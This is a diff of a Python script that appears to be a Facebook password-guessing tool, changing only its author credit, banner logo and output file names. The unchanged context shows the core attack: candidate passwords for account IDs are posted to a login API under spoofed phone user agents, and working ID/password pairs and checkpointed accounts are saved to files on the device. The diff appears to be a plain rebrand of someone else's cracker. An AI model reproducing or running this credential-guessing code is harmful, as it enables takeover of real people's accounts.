@@ -1,4 +1,4 @@
-#sc by b.mohamed#
+#sc by semitsu#
 from os import path
 import os,base64,zlib,pip,urllib
 print('\033[1;32m') 
@@ -36,11 +36,10 @@ def UA():
 modlll = random.choice(['vivo 1920','2209116AG','SM-A235F','SM-F936B','SM-A525F','SM-G3518','U319AA','SM-A716U']) 
 #------------------------------------------------#
 logo=("""\033[1;32m
-PPPPPP   OOOOO  WW      WW EEEEEEE RRRRRR  
-PP   PP OO   OO WW      WW EE      RR   RR 
-PPPPPP  OO   OO WW   W  WW EEEEE   RRRRRR  
-PP      OO   OO  WW WWW WW EE      RR  RR  
-PP       OOOO0    WW   WW  EEEEEEE RR   RR 
+████████████████████████████████████████████
+█─▄▄▄▄█▄─▄▄─█▄─▀█▀─▄█▄─▄█─▄─▄─█─▄▄▄▄█▄─██─▄█
+█▄▄▄▄─██─▄█▀██─█▄█─███─████─███▄▄▄▄─██─██─██
+▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▀▄▄▄▄▀▀
 \033[1;37m================\033[1;37m===========\033[1;37m================
                \033[1;32mVERISION\033[1;31m : \033[1;32m1.0.0
 \033[1;37m================\033[1;37m===========\033[1;37m================
@@ -177,16 +176,16 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [POWER-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SEMITSU-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SEMITSU-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:                                   
-                                                #print('\r\r\x1b[38;5;208m [POWER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                #print('\r\r\x1b[38;5;208m [SEMITSU-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/POWER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break                                        
-                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SEMITSU-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
